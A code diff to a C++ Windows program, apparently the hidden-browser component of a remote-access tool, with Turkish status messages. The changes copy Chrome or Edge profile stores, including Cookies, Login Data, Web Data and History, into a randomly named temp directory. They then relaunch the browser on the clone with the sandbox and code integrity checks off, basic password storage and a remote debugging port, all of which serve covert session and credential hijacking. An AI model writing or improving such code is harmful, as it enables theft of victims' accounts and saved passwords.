@@ -1134,19 +1134,57 @@ static wstring get_browser_path(const wstring& browser_exe) {
     wchar_t path[MAX_PATH];
     DWORD size = sizeof(path);
     wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browser_exe;
+    wstring result = L"";
+
     if (RegGetValueW(HKEY_LOCAL_MACHINE, subkey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
-        return path;
+        result = path;
+    } else {
+        size = sizeof(path);
+        if (RegGetValueW(HKEY_CURRENT_USER, subkey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
+            result = path;
+        }
     }
-    size = sizeof(path);
-    if (RegGetValueW(HKEY_CURRENT_USER, subkey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
-        return path;
+
+    if (!result.empty()) {
+        if (result.length() >= 2 && result.front() == L'\"' && result.back() == L'\"') {
+            result = result.substr(1, result.length() - 2);
+        }
     }
-    return L"";
+    return result;
+}
+
+static bool smart_copy_or_link(const std::filesystem::path& src, const std::filesystem::path& dst) {
+    namespace fs = std::filesystem;
+    try {
+        if (fs::is_directory(src)) {
+            if (!fs::exists(dst)) fs::create_directories(dst);
+            for (const auto& entry : fs::directory_iterator(src)) {
+                smart_copy_or_link(entry.path(), dst / entry.path().filename());
+            }
+        } else {
+            wstring name = src.filename().wstring();
+            if (name == L"SingletonLock" || name == L"SingletonCookie" || name == L"Parent.lock" || name == L"lockfile") return true;
+
+            // Files that often have exclusive locks or are essential for profile identity
+            if (name == L"Local State" || name == L"Preferences" || name == L"Cookies" ||
+                name == L"Login Data" || name == L"Web Data" || name == L"History" ||
+                name == L"Network Action Predictor" || name == L"Top Sites") {
+                CopyFileW(src.wstring().c_str(), dst.wstring().c_str(), FALSE);
+            } else {
+                if (!CreateSymbolicLinkW(dst.wstring().c_str(), src.wstring().c_str(), SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE)) {
+                    CopyFileW(src.wstring().c_str(), dst.wstring().c_str(), FALSE);
+                }
+            }
+        }
+        return true;
+    } catch (...) {
+        return false;
+    }
 }
 
 static bool create_browser_clone(const wstring& browser_name, wstring& target_data_dir) {
     wchar_t localAppData[MAX_PATH];
-    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) return false;
+    if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH) == 0) return false;
 
     wstring source_path;
     if (browser_name == L"chrome.exe") {
@@ -1165,7 +1203,7 @@ static bool create_browser_clone(const wstring& browser_name, wstring& target_da
     std::random_device rd;
     std::mt19937 gen(rd());
     std::uniform_int_distribution<> dis(10000, 99999);
-    wstring random_name = browser_name + L"_" + to_wstring(dis(gen));
+    wstring random_name = (browser_name == L"chrome.exe" ? L"chrome" : L"edge") + L"_" + to_wstring(dis(gen));
     target_data_dir = wstring(temp_path) + random_name;
 
     try {
@@ -1175,15 +1213,22 @@ static bool create_browser_clone(const wstring& browser_name, wstring& target_da
     send_status("profiller kopyalanıyor...");
 
     namespace fs = std::filesystem;
-    for (const auto& entry : fs::directory_iterator(source_path)) {
-        wstring name = entry.path().filename().wstring();
-        if (name == L"SingletonLock" || name == L"SingletonCookie" || name == L"Parent.lock" || name == L"lockfile") continue;
+    fs::path src_path(source_path);
+    fs::path dst_path(target_data_dir);
 
-        wstring dest = target_data_dir + L"\\" + name;
-        if (entry.is_directory()) {
-            CreateSymbolicLinkW(dest.c_str(), entry.path().wstring().c_str(), SYMBOLIC_LINK_FLAG_DIRECTORY | SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE);
-        } else {
-            CreateSymbolicLinkW(dest.c_str(), entry.path().wstring().c_str(), SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE);
+    // Copy/Link essential top-level files
+    for (const auto& entry : fs::directory_iterator(src_path)) {
+        wstring name = entry.path().filename().wstring();
+        if (name == L"Local State" || name == L"Last Version") {
+            CopyFileW(entry.path().wstring().c_str(), (dst_path / name).wstring().c_str(), FALSE);
+        } else if (entry.is_directory() && (name == L"Default" || name.find(L"Profile ") == 0)) {
+            // Recursively process profile directories
+            smart_copy_or_link(entry.path(), dst_path / name);
+        } else if (!entry.is_directory()) {
+            // Link other top-level files
+            if (name != L"SingletonLock" && name != L"SingletonCookie") {
+                CreateSymbolicLinkW((dst_path / name).wstring().c_str(), entry.path().wstring().c_str(), SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE);
+            }
         }
     }
 
@@ -1205,7 +1250,7 @@ static void launch_browser_thread(wstring browser_name) {
 
     send_status("program başlatılıyor");
 
-    wstring cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir + L"\" --no-sandbox --disable-gpu --password-store=basic --remote-debugging-port=0 --disable-features=RendererCodeIntegrity";
+    wstring cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir + L"\" --no-sandbox --disable-gpu --password-store=basic --remote-debugging-port=0 --disable-features=RendererCodeIntegrity --no-first-run --no-default-browser-check --disable-sync --disable-extensions --profile-directory=\"Default\"";
     vector<wchar_t> cmdVec(cmdLine.begin(), cmdLine.end());
     cmdVec.push_back(L'\0');
 
@@ -1217,7 +1262,7 @@ static void launch_browser_thread(wstring browser_name) {
 
     PROCESS_INFORMATION pi = { 0 };
     if (CreateProcessW(NULL, cmdVec.data(), NULL, NULL, FALSE,
-                       CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                       CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         g_forceFullFrame = true;
